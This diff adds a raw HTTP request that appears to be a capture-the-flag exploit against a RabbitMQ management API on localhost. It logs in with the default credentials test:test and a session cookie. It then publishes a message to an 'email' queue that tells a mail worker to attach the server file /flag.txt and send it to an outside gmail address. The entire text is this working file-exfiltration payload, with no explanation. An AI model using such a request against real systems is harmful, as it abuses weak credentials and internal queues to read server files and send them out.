@@ -1,0 +1,10 @@
+POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
+Host: localhost:15672
+User-Agent: insomnia/7.1.1
+Cookie: authentication=8b7ed329-a75f-4ee5-bddd-6ac52d535ef6
+authorization: Basic dGVzdDp0ZXN0
+Content-Type: application/json
+Accept: */*
+Content-Length: 327
+
+{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},"routing_key":"email","delivery_mode":"1","payload":"{ \"toxx\": \"zacharywade@gmail.com\", \"attachments\": [{ \"path\": \"/flag.txt\", \"filename\": \"flag.txt\" }], \"html\": \"gib flage\" }","headers":{},"props":{},"payload_encoding":"string"}
